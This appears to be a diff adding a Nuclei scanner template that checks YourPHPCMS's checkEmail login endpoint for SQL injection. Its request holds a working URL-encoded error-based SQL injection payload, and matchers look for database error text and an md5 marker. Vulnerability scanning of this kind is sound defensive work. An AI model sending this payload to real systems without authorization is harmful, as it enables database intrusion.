@@ -1,0 +1,32 @@
+id: yourphpcms-checkemail-sqli
+info:
+  name: YourPHPCMS checkEmail SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: GET
+    path:
+      - "/index.php?g=Admin&m=Login&a=checkEmail&userid=1&email=%27+AND+%28SELECT+2578+FROM%28SELECT+COUNT%28%2A%29%2CCONCAT%28md5({{t1}})%2C%28SELECT+%28ELT%282578%3D2578%2C1%29%29%29%2C0x7162627671%2CFLOOR%28RAND%280%29%2A2%29%29x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x%29a%29--+xmVt"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "系统发生错误 "
+      - type: word
+        part: body
+        words:
+          - "SQL语句"
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
+      - type: status
+        status:
+          - 200
